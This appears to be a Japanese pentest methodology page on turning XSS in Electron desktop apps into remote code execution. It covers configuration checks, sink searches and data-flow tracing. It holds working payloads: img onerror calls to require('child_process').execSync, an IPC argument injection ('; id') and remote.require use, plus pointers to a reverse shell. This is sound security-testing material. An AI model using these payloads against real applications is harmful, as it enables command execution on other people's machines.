# Electron アプリ XSS → RCE エスカレーション

> **スコープ**: Electron デスクトップアプリの XSS から OS コマンド実行（RCE）への昇格。webPreferences の確認〜XSS sink の特定〜データフロー追跡〜PoC 確認〜RCE ペイロードまで扱う。RCE 取得後は `../../06_Concepts/Reverse_Shell.md` のリバースシェル手順へ。原理 → `../../06_Concepts/Electron_Security.md`

## 着火条件

以下の**3 条件がすべて揃った**ときに試す：

1. **Electron デスクトップアプリ**（.exe / .dmg / AppImage 等）を対象にしている
2. **ユーザー制御データが HTML として挿入される sink が存在する**（`.html()` / `innerHTML` / `dangerouslySetInnerHTML`）
3. **`nodeIntegration: true` かつ `contextIsolation: false`** が設定されている

条件 3 が揃っていない場合は XSS 止まり（RCE には至らない）。

## 環境前提

- **実行環境**: テスター端末（ソース解析）+ 自分が所有するアプリインスタンス（PoC 検証）
- **必要なツール**: `grep` / `ripgrep`（ソースコード解析用。ペネトレ用 Linux ディストリ標準搭載）/ `asar`（バイナリから JS ソース展開。`npx @electron/asar extract app.asar out/` または `npx asar extract app.asar out/`）
- **前提**: アプリのソースコードまたはビルド済みバイナリが入手できること
- **オフライン代替**: ソースが GitHub 公開リポジトリにある場合は `gh api` または `curl` で生ファイルを取得できる

## 先に確認すること

| 確認項目 | コマンド | 出たら次のアクション |
|---------|---------|----------------|
| `nodeIntegration` の値 | `grep -r "nodeIntegration" src/` | `true` → RCE 到達可能性あり。`false` → §6 別経路へ |
| `sandbox` の値 | `grep -r "sandbox" src/` | `sandbox: true` が `nodeIntegration: true` と同時設定されていると nodeIntegration が無視される。両方確認 |
| `contextIsolation` の値 | `grep -r "contextIsolation" src/` | `false` → RCE 到達可能性あり。`true` → preload + contextBridge の expose 内容を確認 |
| `preload` スクリプトの有無 | `grep -r "preload" src/` | あれば `contextBridge.exposeInMainWorld(...)` の内容を確認。`exec` / `spawn` が expose されていれば `contextIsolation: true` でも RCE |
| innerHTML 系 sink の存在 | `grep -r "\.html(" src/` / `grep -r "innerHTML" src/` | ヒットしたらデータフローを追う |
| IPC ハンドラ | `grep -r "ipcMain.on\|ipcMain.handle" src/` | 引数を無検証で `exec` に渡す実装を探す |

**ユーザー制御データの経路（典型）:**

```
ユーザー入力（テキストフィールド・名前・コメント等）
  → サーバー保存（API 経由）
  → サーバー返却（GET /api/[リソース] → JSON）
  → クライアント描画（対象コンポーネント）
  → sink: $element.html(apiResponse.field)  ← ここが爆発点
```

**攻撃者の思考トレース:** `nodeIntegration: true` のとき Electron がレンダラーのグローバルスコープに `require` を inject する。XSS でスクリプトを実行できれば `require('child_process')` を呼べる = OS コマンド実行に到達する。jQuery `.html()` は `innerHTML` と同義で、サーバー返却値をそのまま渡すとユーザーが制御できる HTML が DOM に挿入される。

---

## 1. webPreferences を確認する

**コマンド:**

```bash
# [Attacker] ソースからウィンドウ生成コードを探す
grep -rn "webPreferences" src/ --include="*.ts" --include="*.js"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `nodeIntegration: true` かつ `contextIsolation: false` | RCE 到達可能性あり | §2 XSS sink 探索へ |
| `nodeIntegration: false` | XSS 止まり（RCE に至らない）| XSS 単体評価 + §6 別経路を確認 |
| `sandbox: true` が同時設定 | sandbox が nodeIntegration を上書き | preload + contextBridge 経路へ（§6）|

---

## 2. XSS sink を探す

**コマンド:**

```bash
# [Attacker] jQuery .html() sink（innerHTML と同義）
grep -rn "\.html(" src/client/ --include="*.ts" --include="*.js"

# [Attacker] 生の innerHTML
grep -rn "innerHTML" src/client/ --include="*.ts" --include="*.js"

# [Attacker] React の dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `.html(` / `innerHTML =` がヒット | XSS sink 候補 | §3 データフローを追う |
| React `{}` のみ（`dangerouslySetInnerHTML` なし）| JSX の自動エスケープが有効 | 別 sink を探す |

---

## 3. データフローを確認する

sink にヒットしたファイルを読み、その引数がどこから来るかを追う。

- ユーザー制御可能なフィールド（`apiResponse.[USER_FIELD]`：タイトル / 名前 / 表示名 / コメント本文等）が sink にそのまま渡されている → サニタイズなし確定
- クライアント側に `DOMPurify.sanitize()` 等の呼び出しがなければ脆弱
- 中間に変換（`decodeURIComponent` / `atob` / `JSON.parse` 等）が挟まる場合は、変換が脅威モデル外ならエンコーダ / デコーダ非対称性が成立する可能性あり

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ユーザー制御フィールドが sink に直接渡されている | サニタイズなし確定 | §4 PoC 確認へ |
| `DOMPurify.sanitize()` が sink 前に呼ばれている | クライアント側サニタイズあり | 他の sink（別コンポーネント）を探す |

---

## 4. PoC（ブラウザで原理確認）

**コマンド（poc_xss_sim.html として保存してブラウザで開く）:**

```html
<!DOCTYPE html>
<html>
<body>
  <div id="title"></div>
  <script>
    const payload = '<img src=x onerror="document.getElementById(\'title\').textContent=\'XSS fired\'">';
    document.getElementById('title').innerHTML = payload;
  </script>
</body>
</html>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ブラウザで「XSS fired」と表示される | `.html()` / `innerHTML` が任意スクリプトを実行できることを証明 | §5 アプリ上での実機確認へ |

---

## 5. アプリ上での実機確認（自分のインスタンスのみ）

**手順（自分が所有・管理するアプリインスタンスで実施）:**

```
1. アプリを起動する
2. XSS ペイロードをデータとして入力・保存する:
   <img src=x onerror="alert('XSS')">
   （入力できる箇所: テキストフィールド・名前欄・説明欄等）
3. そのデータが描画されるビュー / ダイアログを開く
4. alert ダイアログが出る → XSS 発火確認
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| alert ダイアログが出る | アプリ上で XSS 発火確認 | §6 RCE ペイロードへ |
| alert が出ない / PoC が壊れる | クォートのネストエラー / サニタイズあり | クォートを確認（外側 `"` なら内側 `'`）/ §3 別 sink へ |

**注意:** **PoC のクォートが壊れていても XSS 自体は発火する**（壊れたアイコン + コンソールの SyntaxError が証拠）。

---

## 6. RCE ペイロード（nodeIntegration: true 環境のみ）

**コマンド（ペイロード例）:**

```html
<!-- [Attacker] 自分のインスタンスのみで確認すること -->
<!-- Linux / macOS: id の出力を alert で表示 -->
<img src=x onerror="alert(require('child_process').execSync('id').toString())">

<!-- [Attacker] Windows: notepad を起動して RCE 到達を確認 -->
<img src=x onerror="require('child_process').execSync('notepad')">
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `id` の出力が alert に表示される（Linux）| **RCE 成立** | リバースシェル取得 → `../../06_Concepts/Reverse_Shell.md` |
| notepad が起動する（Windows）| **RCE 成立** | リバースシェル取得 → 同上 |
| `require is not defined` | `nodeIntegration: false` / contextIsolation | preload + contextBridge / IPC 経路を確認（§刺さらなかったとき）|

**注意:** `onerror="require('child_process')..."` は外側が `"` なら内側は `'` で問題ない。外側が `'` のとき内側に `'` を使うと SyntaxError になる。**Windows の `calc` は UWP ラッパー経由で挙動が不安定なため `notepad` が推奨。** `require()` はアプリのコードには書いていない（Electron がグローバルに inject する）。

---

## 刺さらなかったとき（全体）

| 観測される状況 | 推定原因 | 次の手 |
|---|---|---|
| `nodeIntegration: false` | XSS は残るが RCE に至らない | XSS 単体評価 + 下記代替経路 |
| `sandbox: true` が同時設定 | nodeIntegration が無効化 | preload + contextBridge 経路へ |
| `contextIsolation: true` | 直接 `require()` は不可 | `grep -r "exposeInMainWorld" src/` で expose 内容を確認。`exec` / `spawn` が expose されていれば XSS から呼べる |
| IPC 経由 RCE | `ipcMain.on` が引数を無検証で `exec` に渡す | XSS から `ipcRenderer.invoke('[HANDLER_NAME]', '; id')` で呼ぶ |
| `enableRemoteModule: true`（Electron < 14）| レンダラーから `remote.require()` 経由で Node.js API を呼べる | `const { remote } = require('electron'); remote.require('child_process').execSync('id')` |
| カスタムプロトコル（`app://` 等）が存在 | SOP 迂回 / スクリプト実行起点 | `protocol.register*` の実装を確認。`file:` と同等の権限で実行される場合あり |

---

## 注意点・落とし穴

- **`require()` はアプリのコードには書いていない**: `nodeIntegration: true` のとき Electron がグローバルに inject する。コードを grep しても出てこないが XSS ペイロード内で使える
- **開発停止 / archived リポジトリでも CVE は有効**: 脆弱バージョンのユーザーは引き続き存在する
- **事前合意の前提**: 「対象は自分が所有・管理するインスタンスのみ。第三者環境には一切ペイロードを送らない」

---

## 関連技術

- 前：Electron アプリの存在を確認（ファイル拡張子 / プロセス名 / パッケージ情報）→ `../../01_Reconnaissance/Web_Enumeration.md`
- 前：XSS sink の基本パターン（`.html()` / `innerHTML` の危険性）→ `XSS.md`（コードレビュー観点セクション）
- 後：RCE 到達後のリバースシェル取得 → `../../06_Concepts/Reverse_Shell.md`
- 関連：Electron の nodeIntegration / contextIsolation の仕組み → `../../06_Concepts/Electron_Security.md`
- 関連：バリアント（同クラスの脆弱性を別プロジェクトで探す手法）→ `../../06_Concepts/Variant_Hunting.md`
